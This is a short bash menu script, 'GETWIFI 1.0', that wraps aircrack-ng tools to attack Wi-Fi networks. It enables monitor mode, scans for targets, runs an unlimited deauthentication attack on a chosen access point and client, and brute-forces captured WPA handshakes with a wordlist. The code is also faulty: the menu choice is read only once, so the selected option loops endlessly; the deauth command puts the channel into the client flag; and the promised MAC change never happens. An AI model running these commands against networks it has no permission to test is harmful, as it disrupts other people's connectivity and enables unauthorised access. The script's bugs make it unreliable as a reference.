#!/bin/bash


clear
figlet "GETWIFI 1.0"
echo "By:FrankoSav"
echo "Choose an option:"
echo "1. Start Monitor Mode Switch name o WLAN0MON and change MAC"
echo "2. Stop Monitor Mode"
echo "3. Network Scan"
echo "4. Atack Deauth"
echo "5. Handshake Brute Force"
echo "6. Scan Specific Target Network"
echo "7. Exit"
read -p "Opcion: " opcion

while true; do
  case $opcion in
    1)
      # Mon mode on and changed mac
      sudo airmon-ng start wlan0
      sudo airmon-ng check kill

      read -p "Enter para volver al menú"
      ;;
    2)
      # Mon mode off
      sudo airmon-ng stop wlan0
      /etc/init.d/networking restart

      read -p "Enter to return to the menu"
      ;;
    3)
      # Scan with interface
      sudo airodump-ng wlan0

      read -p "Enter to return to the menu"
      ;;
    4)
      # Deauth attack
      read -p "CHANNEL OF TARGET: " channel
      read -p "ACCES POINT TARGET MAC: " mac_ap
      read -p "CLIENT TARGET MAC: " mac_cliente
      aireplay-ng --deauth 0 -c $channel -a $mac_ap -c $mac_cliente wlan0

      read -p "Enter to return to the menu"
      ;;
     5)
      # Enter handshake file
      read -p "Enter the path of the handshake file: " handshake_file
            
      # Enter wordlist for bruteforce
      read -p "Enter the dictionary path to use: " wordlist_file
            
      # Cracking Handshake
      aircrack-ng $handshake_file -w $wordlist_file
            
            read -p "Enter to return to the menu"
      ;;
     6)
      # Scaning Network Target
      read -p "CHANNEL OF TARGET: " channel
      read -p "EESID OF TARGET MAC: " essid
      airodump-ng -c $channel --essid $essid wlan0
      
      read -p "Enter to return to the menu"
      ;;
     7)
      # Exit
      break
      ;;
    *)
      echo "Invalid option, please select a valid option"
      ;;
  esac
done

